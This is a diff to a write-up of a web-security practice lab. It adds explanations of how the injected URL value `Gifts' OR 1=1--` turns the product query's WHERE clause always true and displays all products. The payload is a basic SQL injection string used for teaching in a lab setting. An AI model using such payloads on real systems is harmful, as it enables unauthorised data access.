@@ -3,9 +3,21 @@
 ## Manual Solution
 
 ### 1. Open the lab in Web Security Academy.
+### 2. Add the following to the URL: `filter?category=Gifts`
+- This URL triggers the following SQL query 
+    ```sql 
+    SELECT * FROM products WHERE category = 'Gifts'
+    ```
+
 ### 2. Add the following to the URL: `filter?category=Gifts' OR 1=1--`
-### 3. Press Enter.
-### 4. You will see the SQL Injection successful message.
+- This URL triggers the following SQL query: 
+    ```sql 
+    SELECT * FROM products WHERE category = 'Gifts' OR 1 = 1--'
+    ```
+    - The WHERE clause is always true because OR 1 = 1 is always true.
+    - As a result, this URL displays all products regardless of their category.
+
+### 3. You will see the SQL Injection successful message.
 
 ## Automated Solution
 
